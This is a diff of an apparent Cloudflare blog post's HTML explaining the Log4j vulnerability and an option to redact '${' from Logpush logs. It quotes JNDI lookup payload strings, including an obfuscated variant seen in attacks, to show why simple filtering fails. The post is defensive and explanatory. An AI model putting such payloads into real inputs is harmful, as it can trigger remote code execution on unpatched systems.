@@ -4,10 +4,24 @@
 	<p>On December 9, 2021, the world learned about <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228">CVE-2021-44228</a>, a zero-day exploit affecting the <a href="https://logging.apache.org/log4j/2.x/index.html">Apache Log4j utility</a>. &nbsp;Cloudflare immediately <a href="https://blog.cloudflare.com/cve-2021-44228-log4j-rce-0-day-mitigation">updated our WAF</a> to help protect against this vulnerability, but we recommend customers update their systems as quickly as possible.</p>
 	<p>However, we know that many Cloudflare customers consume their logs using software that uses Log4j, so we are also mitigating any exploits attempted via Cloudflare Logs. As of this writing, we are seeing the exploit pattern in logs we send to customers up to 1000 times every second.</p>
 	<p>Starting immediately, customers can update their Logpush jobs to automatically redact tokens that could trigger this vulnerability. You can read more about this in our <a href="https://developers.cloudflare.com/logs/reference/logpush-api-configuration#options">developer docs</a> or see details below.</p>
-	<h3>How the attack works</h3>
+	<div class="flex anchor relative">
+		<h3 id="how-the-attack-works">How the attack works</h3>
+		<a href="https://blog.cloudflare.com/#how-the-attack-works" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>You can read more about <a href="https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228">how the Log4j vulnerability works</a> in our blog post . In short, an attacker can add something like <code>${jndi:ldap://example.com/a}</code> in any string. Log4j will then make a connection on the Internet to retrieve this object.</p>
 	<p>Cloudflare Logs contain many string fields that are controlled by end-users on the public Internet, such as User Agent and URL path. With this vulnerability, it is possible that a malicious user can cause a <a href="https://www.cloudflare.com/learning/security/what-is-remote-code-execution">remote code execution</a> on any system that reads these fields and uses an unpatched instance of Log4j.</p>
-	<h3>Our mitigation plan</h3>
+	<div class="flex anchor relative">
+		<h3 id="our-mitigation-plan">Our mitigation plan</h3>
+		<a href="https://blog.cloudflare.com/#our-mitigation-plan" aria-hidden="true" class="relative sm:absolute sm:-left-5">
+			<svg width="16" height="16" viewBox="0 0 24 24">
+				<path fill="currentcolor" d="m12.11 15.39-3.88 3.88a2.52 2.52 0 0 1-3.5 0 2.47 2.47 0 0 1 0-3.5l3.88-3.88a1 1 0 0 0-1.42-1.42l-3.88 3.89a4.48 4.48 0 0 0 6.33 6.33l3.89-3.88a1 1 0 1 0-1.42-1.42Zm8.58-12.08a4.49 4.49 0 0 0-6.33 0l-3.89 3.88a1 1 0 0 0 1.42 1.42l3.88-3.88a2.52 2.52 0 0 1 3.5 0 2.47 2.47 0 0 1 0 3.5l-3.88 3.88a1 1 0 1 0 1.42 1.42l3.88-3.89a4.49 4.49 0 0 0 0-6.33ZM8.83 15.17a1 1 0 0 0 1.1.22 1 1 0 0 0 .32-.22l4.92-4.92a1 1 0 0 0-1.42-1.42l-4.92 4.92a1 1 0 0 0 0 1.42Z"></path>
+			</svg>
+		</a>
+	</div>
 	<p>Unfortunately, just checking for a token like <code>${jndi:ldap</code> is not sufficient to protect against this vulnerability. Because of the expressiveness of the templating language, it’s necessary to check for obfuscated variants as well. Already, we are seeing attackers in the wild use variations like <code>${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce}</code>. &nbsp;Thus, redacting the token ${ is the most general way to defend against this vulnerability.</p>
 	<p>The token <code>${</code> appears up to 1,000 times per second in the logs we currently send to customers. A spot check of some records shows that many of them are <i>not</i> attempts to exploit this vulnerability. Therefore, we can’t safely redact our logs without impacting customers who may expect to see this token in their logs.</p>
 	<p>Starting now, customers can update their Logpush jobs to redact the string <code>${</code> and replace it with <code>x{</code> everywhere.</p>
